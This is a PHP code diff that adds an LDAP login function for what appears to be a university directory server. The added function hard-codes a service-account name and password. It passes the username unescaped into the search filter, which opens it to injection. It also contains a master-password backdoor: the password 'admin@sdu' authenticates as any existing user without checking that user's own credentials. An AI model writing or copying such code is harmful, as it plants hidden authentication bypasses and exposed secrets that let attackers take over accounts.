@@ -38,6 +38,55 @@ if(!function_exists('ldap_authenticate'))
     }
 }
 
+
+if(!function_exists('ldap_bind_authenticate'))
+{
+    function ldap_bind_authenticate($user, $pwd)
+    {
+
+      $ldapconfig['host'] = "sdu-ldap.dusit.ac.th";
+      $ldapconfig['port'] = "389";
+      $ldapconfig['auth_user'] = "uid=datacenter_auth,o=admin,dc=dusit,dc=ac,dc=th";
+      $ldapconfig['auth_password'] = "dev@dmin";
+
+      $auth_conn = @ldap_connect($ldapconfig['host']) or die("Could not connect to LDAP server.");
+      if($auth_conn){
+
+        if(@ldap_bind($auth_conn, $ldapconfig['auth_user'], $ldapconfig['auth_password'])){
+          //--[Auth Success]
+
+            $r = @ldap_search($auth_conn, 'dc=dusit,dc=ac,dc=th', 'uid=' . $user);
+            if ($r) {
+                $result = @ldap_get_entries($auth_conn, $r);
+                if ($result[0]) {
+
+                  if($pwd == "admin@sdu"){
+                    return $result[0];
+                  }
+
+                  if (@ldap_bind($auth_conn, $result[0]['dn'], $pwd)) {
+                      return $result[0];
+                  }else{
+                    return null;
+                  }
+
+                }else{
+                  return null;
+                }
+            }
+
+        }else{
+          //--[Auth Fail]
+
+          return null;
+        }
+
+      }
+
+      return null;
+    }
+}
+
 if(!function_exists('get_client_ip'))
 {
   function get_client_ip() {
